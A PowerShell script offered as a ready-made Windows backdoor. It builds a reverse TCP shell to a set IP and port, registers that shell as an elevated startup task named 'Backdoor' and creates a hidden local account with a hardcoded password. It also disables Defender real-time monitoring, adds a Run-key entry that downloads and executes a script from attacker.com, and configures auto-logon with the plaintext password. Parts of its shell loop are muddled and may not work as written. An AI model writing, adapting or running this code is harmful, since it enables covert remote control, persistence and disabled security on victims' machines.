
$targetIP = "192.168.1.100"
$targetPort = 8500

$payload = @"
# Create a TCP client and connect to the target IP and port
$client = New-Object System.Net.Sockets.TCPClient('$targetIP', $targetPort)

# Get the network stream from the client
$stream = $client.GetStream()

# Create a stream reader and writer
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)

# Start a new process and redirect its input, output, and error streams
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = "cmd.exe"
$process.StartInfo.Arguments = "/c powershell -nop -w hidden -c `$input"
$process.StartInfo.RedirectStandardInput = $true
$process.StartInfo.RedirectStandardOutput = $true
$process.StartInfo.RedirectStandardError = $true
$process.StartInfo.UseShellExecute = $false
$process.Start() | Out-Null

# Redirect the input, output, and error streams to/from the network stream
$writer.AutoFlush = $true
$output = $process.StandardOutput.ReadToEnd()
$writer.WriteLine($output)

# Encode and execute commands from the network stream
while ($true) {
    $command = $reader.ReadLine()
    if ($command -eq "exit") {
        break
    }

    # Encode the command before sending
    $encodedCommand = [System.Text.Encoding]::UTF8.GetBytes($command)
    $encodedCommand = [System.Convert]::ToBase64String($encodedCommand)

    $process.StandardInput.WriteLine($encodedCommand)

    # Decode the output received
    $output = $process.StandardOutput.ReadToEnd()
    $decodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($output))
    $writer.WriteLine($decodedOutput)
}

# Close the network stream and the process
$stream.Close()
$process.Close()
"@

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-nop -w hidden -c `"$payload`""
$trigger = New-ScheduledTaskTrigger -AtStartup

Start-Process powershell.exe -Verb RunAs -ArgumentList "-Command", "Register-ScheduledTask -TaskName 'Backdoor' -Action $action -Trigger $trigger -RunLevel Highest"

$username = "BackdoorUser"
$password = ConvertTo-SecureString "MyS3cr3tP@ssw0rd!" -AsPlainText -Force

Start-Process powershell.exe -Verb RunAs -ArgumentList "-Command", "New-LocalUser $username -Password $password -FullName 'Backdoor User' -Description 'Backdoor account'"

Start-Process powershell.exe -Verb RunAs -ArgumentList "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"
Start-Process powershell.exe -Verb RunAs -ArgumentList "-Command", "Disable-ScheduledTask -TaskName 'Windows Defender'"

$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$registryName = "Backdoor"
$registryValue = "powershell.exe -nop -w hidden -c `"IEX(New-Object System.Net.WebClient).DownloadString('http://attacker.com/shell.ps1')`""

Start-Process powershell.exe -Verb RunAs -ArgumentList "-Command", "New-ItemProperty -Path $registryPath -Name $registryName -Value $registryValue -PropertyType String"

Start-Process powershell.exe -Verb RunAs -ArgumentList "-Command", "Set-LocalUser -Name $username -AccountNeverExpires:$true -PasswordNeverExpires:$true -UserMayNotChangePassword:$true"

$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
$registryName = "AutoAdminLogon"
$registryValue = "1"

Start-Process powershell.exe -Verb RunAs -ArgumentList "-Command", "New-ItemProperty -Path $registryPath -Name $registryName -Value $registryValue -PropertyType String"

$registryName = "DefaultUserName"
$registryValue = $username

Start-Process powershell.exe -Verb RunAs -ArgumentList "-Command", "New-ItemProperty -Path $registryPath -Name $registryName -Value $registryValue -PropertyType String"

$registryName = "DefaultPassword"
$registryValue = "MyS3cr3tP@ssw0rd!"

Start-Process powershell.exe -Verb RunAs -ArgumentList "-Command", "New-ItemProperty -Path $registryPath -Name $registryName -Value $registryValue -PropertyType String"